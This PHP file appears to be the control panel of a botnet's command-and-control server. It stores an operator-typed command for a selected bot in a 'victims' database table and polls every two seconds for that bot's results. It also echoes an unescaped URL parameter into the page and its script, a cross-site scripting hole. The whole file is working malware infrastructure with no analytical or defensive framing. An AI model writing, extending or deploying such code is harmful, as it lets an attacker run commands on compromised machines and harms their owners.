<?php
include 'session.php';
include 'conn.php';

if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["cmd"]) && isset($_POST["bot"]))
{
  $setCommand = $mysql->prepare("update victims set cmd=? where hostname=?");
  $setCommand->bind_param("ss", $_POST["cmd"], $_POST["bot"]);
  $setCommand->execute();
}


?>

<html>
<form action="" method="POST">
<input type="text" name="cmd" placeholder="cmd"/>
<input type="hidden" name="bot" value="<?php echo $_GET['bot']; ?>"/>
<input type="submit" name="submit" value="set cmd" />
</form>

<textarea id="resultArea"></textarea>

<script>

function retrieveResult(){

var xmlReq = new XMLHttpRequest();
var url = "/showResults.php?bot="+ "<?php echo $_GET['bot'];?>";
xmlReq.open("GET", url, false);
xmlReq.send( null );

if(xmlReq.responseText.length > 2 )
{
  document.getElementById("resultArea").innerHTML=xmlReq.responseText;
  return;

}
setTimeout(retrieveResult, 2000);

}

retrieveResult();

</script>



</html>
